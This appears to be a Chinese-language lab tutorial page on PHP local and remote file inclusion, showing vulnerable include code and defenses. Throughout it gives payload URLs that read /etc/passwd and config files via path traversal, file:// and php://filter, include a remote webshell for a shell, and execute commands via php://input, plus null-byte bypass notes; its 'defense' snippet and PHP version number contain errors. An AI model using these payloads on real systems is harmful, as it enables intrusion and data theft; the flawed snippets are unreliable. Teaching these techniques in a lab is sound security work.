@@ -1,0 +1,284 @@
+<title>文件包含</title>
+
+# 文件包含
+
+## 简介
+
+    文件包含主要包括本地文件包含(LFI)和远程文件包含(RFI)两种形式
+
+- 本地文件包含就是可以读取和打开本地文件
+
+<p>  
+
+
+- 远程文件包含通过(http、ftp、php伪协议)远程加载文件
+
+**关键函数**
+
+| 函数名              | 说明                                                         |
+| ------------------- | ------------------------------------------------------------ |
+| include "file"      | 如果包含的文件不存在，网站出现告警，不会影响网站其他部分正常运行 |
+| include_once "file" | 只包含一次，包含的文件不存在则告警                           |
+| require "file"      | 如果包含的文件不存在，网站出现致命错误，并停止运行后续其他代码 |
+| require_once "file" | 只包含一次，包含的文件不存在则网站报致命错误并停止运行       |
+
+**漏洞产生的原因**
+
+文件包含是php的正常功能，如果包含的文件名用户可以控制，且后端代码没有进行严格验证，就会造成文件包含漏洞
+
+**漏洞代码示例**
+
+```php {.line-numbers}
+<?php
+    //获取文件名参数
+    $filename = $_GET['filename'];
+    //文件包含
+    include ($filename);
+?>
+```
+
+**防御方法**
+    
+
+- 添加判断条件，验证用户传入的参数
+
+<p>  
+
+
+- 文件包含处文件名写死，如include = xxx.php、filename === xxx.php等
+
+---
+
+## 靶场环境
+
+**10.77(linux)创建文件包含页面include.php**
+
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-23-38.png)
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-24-43.png)
+
+**10.52(Windows)创建文件包含页面include.php**
+
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-27-09.png)
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-09-54-11.png)
+
+## 本地文件包含
+
+**利用**
+
+- 读取系统中其他敏感文件的内容
+
+<p>  
+
+
+- 配合文件上传漏洞getshell
+
+**前提条件**
+
+- php配置文件php.ini中参数allow_url_fopen = On (默认配置就是On的状态)
+
+**文件读取**
+
+- Linux绝对路径读取文件
+
+<p>  
+
+
+-  http://192.168.10.77/include.php?file=/etc/passwd
+   ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-41-53.png)
+
+-  Linux相对路径读取文件
+
+<p>  
+
+
+-
+      http://192.168.10.77/include.php?file=../../../../../../../../../../etc/passwd
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-43-04.png)
+
+- Windows绝对路径读取文件
+
+<p>  
+
+
+-  http://192.168.10.52/include.php?file=C:\Windows\System32\drivers\etc\hosts
+   ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-10-54-46.png)
+
+-  Windows相对路径读取文件，Windows路径从盘符开始，无法通过相对路径切换盘符，这里以当前路径.\演示
+
+<p>  
+
+
+-     http://192.168.10.52/include.php?file=C:\Windows\System32\drivers\etc\.\.\.\.\.\.\hosts
+
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-04-15.png)
+
+
+## 远程文件包含
+
+**利用**
+
+- 不需要猜对方路径，构造webshell直接getshell
+
+**前提条件**
+
+- 前提是能找到这个漏洞~
+
+**文件包含getshell**
+
+- 远程webshell文件如下
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-14-49-00.png)
+
+<p>
+
+
+- 远程文件包含getshell
+
+-     http://192.168.10.77/include.php/?file=http://192.168.10.52/xxx.xxx
+
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-14-50-13.png)
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-14-52-59.png)
+
+## file协议文件包含
+
+**利用**
+
+- file://+绝对路径：访问系统本地文件
+
+**前提条件**
+
+- 读取的目标必须知道目标文件绝对路径
+
+**文件读取**
+
+- file协议文件读取
+
+<p>
+
+
+-     http://192.168.10.77/include.php/?file=file:///etc/passwd
+
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-15-05-44.png)
+
+## php://filter协议文件包含
+
+**利用**
+
+- php配置文件直接文件包含php文件读取时会被自动解析，我们可以通过php://filter协议获取文件源码
+
+**前提条件**
+
+- 没有特殊限制，前提是能找到这个漏洞~    
+
+**文件读取**
+
+- php://filter协议获取文件base64编码
+
+<p>
+
+
+-     http://192.168.10.77/include.php/?file=php://filter/read=convert.base64-encode/resource=./config/config.inc.php
+
+    
+
+- 解码即可获取文件内容
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-15-53-35.png)
+
+<p>
+
+
+- php://filter协议获取文件rot13编码
+
+<p>
+
+
+-     http://192.168.10.77/include.php/?file=php://filter/read/string.rot13/resource=./config/config.inc.php
+
+    ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-15-59-37.png)
+
+- 如果页面没显示可以查看源代码，解码即可
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-02-01.png)
+
+## php://input协议文件包含
+
+**利用**
+
+- 访问原始数据的只读流，接收请求体post参数作为代码任意命令执行
+
+**前提条件**
+
+- php配置文件php.ini中参数allow_url_include = On (默认配置是Off的状态)
+
+**任意命令执行**
+
+- php://input协议
+
+<p>
+
+
+- bp改包
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-12-40.png)
+
+- 效果如下
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-13-25.png)
+
+- 执行获取文件内容命令
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-17-06.png)
+
+- 效果如下
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-18-05.png)
+
+## zip://协议文件包含
+
+读取压缩包文件
+
+利用：webshell放到上传的压缩包文件，然后用zip://协议getshell
+
+## phpmyadmin文件包含-拓展实验
+
+**验证payload**
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-21-16.png)
+
+**开启bp抓包，执行命令**
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-24-34.png)
+
+**保存sessionid**
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-22-33.png)
+
+**通过sessionid验证漏洞**
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-16-25-40.png)
+
+
+
+**部分防御绕过方法**
+
+防御代码
+
+```php
+<?
+    $filename = $_GET['filename'];
+    //拼接文件后缀名
+    include ($file."php");
+?>
+```
+
+**00截断绕过**
+
+- 前置条件
+  1、php版本 < 5.34
+  2、magic_quotes_gpc = Off
+
+- 绕过演示
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-34-08.png)
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-36-05.png)
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-32-32.png)
+  ![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-36-57.png)
+
+此时xxx.txt文件后缀被拼接字符php，无法正常文件包含
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-48-12.png)
+
+bp抓包，添加00截断
+![](D:\icq\t0m4to.github.io\docs\img\文件包含\2022-05-28-11-50-35.png)
+
+路径长度截断
+点号截断
+
